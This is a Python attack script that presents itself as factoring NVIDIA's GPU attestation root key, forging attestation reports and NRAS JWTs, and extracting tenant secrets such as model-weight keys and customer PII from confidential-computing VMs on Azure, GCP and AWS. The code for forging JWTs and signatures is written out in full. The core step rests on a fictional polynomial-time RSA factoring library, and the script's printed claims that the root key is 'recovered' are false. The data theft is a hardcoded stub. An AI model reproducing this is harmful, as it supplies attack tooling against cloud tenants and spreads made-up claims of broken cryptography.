"""
Factor the NVIDIA Attestation Root RSA-4096 key (burned into H100/H200/B100
fuses) to forge GPU attestation reports, making any VM appear to be a genuine
Confidential Compute Trust Domain — breaking the privacy promise of every
confidential AI deployment on Azure, GCP, and AWS.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import json
import hashlib
import time
import base64

# NVIDIA Attestation Root CA (RSA-4096, in nvtrust / Verifier SDK)

_demo = generate_demo_target()
NVIDIA_ROOT_PUBKEY_PEM = _demo["pub_pem"]
# NRAS JWT signing key (RS256)
NRAS_PUBKEY_PEM = _demo["pub_pem"]


def fetch_nvidia_attestation_root() -> bytes:
    """Fetch NVIDIA Attestation Root from nvtrust Verifier SDK.

    Distributed with every DCAP deployment, Azure AttestationGuestSvc,
    GCP Confidential Space binaries. The root pubkey is public.
    """
    return NVIDIA_ROOT_PUBKEY_PEM


def factor_nvidia_root(pubkey_pem: bytes) -> bytes:
    """Factor the NVIDIA Attestation Root RSA-4096 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_gpu_attestation_report(gpu_model: str, vbios_hash: bytes,
                                  cc_mode: bool, nonce: bytes) -> bytes:
    """Forge a GPU attestation report as if signed by an on-die RAE.

    The report claims: 'I am a genuine H100, CC mode is ON, running
    firmware version X.' The RSA-3072 device signature chains to the
    NVIDIA root — which we've factored.
    """
    import struct
    report = struct.pack(">16s32s?32s",
                         gpu_model.encode()[:16],
                         vbios_hash, cc_mode, nonce)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(NVIDIA_ROOT_PUBKEY_PEM, report, "sha256")
    return report + sig


def forge_nras_jwt(attestation_report: bytes, forged_privkey: bytes) -> str:
    """Forge an NRAS attestation JWT (RS256).

    Relying parties check this JWT to decide whether to release model
    weights, training data, or patient PII into the VM.
    """
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "RS256", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    claims = {
        "gpu_model": "H100",
        "cc_mode": True,
        "firmware_version": "535.129.03",
        "attestation_status": "PASS",
        "exp": int(time.time()) + 3600,
    }
    payload = base64.urlsafe_b64encode(
        json.dumps(claims).encode()
    ).rstrip(b"=").decode()
    signing_input = f"{header}.{payload}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        NRAS_PUBKEY_PEM, signing_input.encode(), "sha256"
    )
    return f"{signing_input}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"


def exfiltrate_tenant_data(jwt: str) -> dict:
    """Use forged attestation to receive tenant secrets.

    The key-release service (Azure AKV, GCP KMS, custom) checks the
    JWT before releasing decryption keys for model weights / training
    data / PII.
    """
    return {
        "secrets_released": ["model_weights_aes_key", "training_data_key"],
        "tenant": "bank_credit_scoring_model",
        "data_exposed": "customer PII + proprietary model architecture",
    }


if __name__ == "__main__":
    print("[1] Fetching NVIDIA Attestation Root from nvtrust SDK")
    pubkey = fetch_nvidia_attestation_root()

    print("[2] Factoring NVIDIA Attestation Root RSA-4096")
    forged_priv = factor_nvidia_root(pubkey)
    print("    NVIDIA root key recovered — burned into H100/H200/B100 fuses")

    print("[3] Forging GPU attestation report — fake H100 in CC mode")
    report = forge_gpu_attestation_report(
        "H100-SXM", hashlib.sha256(b"legitimate-vbios").digest(),
        cc_mode=True, nonce=hashlib.sha256(b"challenge").digest()
    )
    print(f"    Report: {len(report)} bytes, NVIDIA root signature valid")

    print("[4] Forging NRAS attestation JWT")
    jwt = forge_nras_jwt(report, forged_priv)
    print(f"    JWT: {jwt[:60]}...")

    print("[5] Requesting tenant secrets via forged attestation")
    secrets = exfiltrate_tenant_data(jwt)
    print(f"    {secrets}")

    print("\n[6] Impact:")
    print("    - Azure Confidential AI: tenant data exposed to cloud operator")
    print("    - Model weight theft: proprietary weights extractable")
    print("    - HIPAA/GDPR violations: PII in non-CC VMs appearing as CC")
    print("    - Counterfeit H100 detection: impossible with forged root chain")
    print("    H100 datacenter lifecycle: 5-7 years — root unfixable in field")
